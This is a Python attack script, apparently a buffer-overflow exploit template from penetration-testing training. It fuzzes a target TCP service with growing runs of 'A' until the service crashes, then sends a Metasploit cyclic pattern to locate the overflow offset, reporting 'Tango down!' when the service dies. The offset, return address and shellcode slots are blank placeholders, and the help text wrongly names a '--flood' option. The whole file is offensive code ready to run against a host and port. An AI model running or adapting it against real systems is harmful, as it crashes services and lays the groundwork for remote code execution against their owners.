#!/usr/bin/env python3

import argparse
import socket
import subprocess
import sys
import time

parser = argparse.ArgumentParser()
parser.add_argument('--fuzz',action='store_true')
parser.add_argument('--overflow',action='store_true')
parser.add_argument('--host')
parser.add_argument('--port',type=int)
parser.add_argument('--prefix')
parser.add_argument('--length',type=int)
args = parser.parse_args()

ip = args.host
port = args.port
target = (ip,port)
timeout = 3
prefix = args.prefix

def connect():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    client.settimeout(timeout)
    client.connect(target)
    client.recv(1024)
    return client

def fuzz():
    string = prefix + "A" * 100
    while True:
        try:
            with connect() as client:
                print("[*] Fuzzing with {} bytes".format(len(string) - len(prefix)))
                client.send(bytes(string, "latin-1"))
                client.recv(1024)
        except socket.error as err:
            print("[x] Failed to connect to port %d." % port)
            sys.exit(0)
        except:
            print("[!] Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
            sys.exit(0)
        
        string += "A" * 100
        time.sleep(1)

def overflow(length):
    offset = 0
    overflow = "A" * offset
    retn = ""
    padding = ""
    if subprocess.run(['which','msf-pattern_create'], stdout=subprocess.DEVNULL).returncode == 0:
        payload = subprocess.check_output(['msf-pattern_create','-l',length],universal_newlines=True).rstrip()
    else:
        print("[x] msf-pattern_create not found.")
        exit()
    suffix = ""
    bof = prefix + overflow + retn + padding + payload + suffix

    try:
        client = connect()
        client.send(bytes(bof + "\r\n","latin-1"))
        client.close()
        print("[+] Sent BOF.")
        try:
            client = connect()
            client.close()
        except:
            print("[+] Tango down!")
    except:
        print("[x] Failed to connect to port %d." % port)

if __name__ == "__main__":
    if not args.fuzz and not args.overflow:
        print("[x] Please specify an option using either --fuzz or --flood.")
    if not args.host:
        print("[x] Please specify a host using --host.")
    elif not args.port:
        print("[x] Please specify a port using --port.")
    elif not args.prefix:
        print("[x] Please specify a prefix using --prefix.")
    elif args.fuzz:
        fuzz()
    elif args.overflow:
        if args.length:
            overflow(str(args.length))
        else:
            print("[x] Please specify a pattern length using --length.")
